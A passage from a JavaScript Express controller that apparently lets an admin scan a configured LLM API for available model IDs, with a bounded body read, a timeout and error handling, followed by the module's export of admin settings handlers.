            headers.Authorization = `Bearer ${llmApiKey}`
        }
        const response = await fetch(`${llmApiUrl}/models`, {
            method: 'GET',
            headers,
            signal: controller.signal,
        })

        // Inside the try and before clearTimeout on purpose: the deadline has to
        // cover the body, not just the response headers.
        const body = await readBoundedText(response, BACKEND_PROBE_MAX_BYTES)

        if (!response.ok) {
            return res.status(400).json({
                success: false,
                error: 'Failed to fetch models',
                status: response.status,
                details: body,
            })
        }

        let data = null
        try {
            data = JSON.parse(body)
        } catch (err) {
            data = null
        }
        const ids = Array.isArray(data?.data)
            ? data.data
                  .slice(0, MODEL_SCAN_MAX_MODELS)
                  .map(entry => String((entry && entry.id) || ''))
                  .filter(id => id.length > 0)
            : []

        res.json({ success: true, models: ids })
    } catch (error) {
        if (error && error.name === 'AbortError') {
            return res.status(504).json({ success: false, error: 'Model scan timeout' })
        }
        logger.error({ err: error }, '[LLM] Admin model scan failed')
        res.status(500).json({ success: false, error: 'Model scan failed' })
    } finally {
        clearTimeout(timeout)
    }
}

export default {
    adminSettingsPage: expressify(adminSettingsPage),
    complianceSettingsPage: expressify(complianceSettingsPage),
    getAdminSettings: expressify(getAdminSettings),
    saveAdminSettings: expressify(saveAdminSettings),
    checkAdminLLMConnection: expressify(checkAdminLLMConnection),
    scanAdminModels: expressify(scanAdminModels),
}
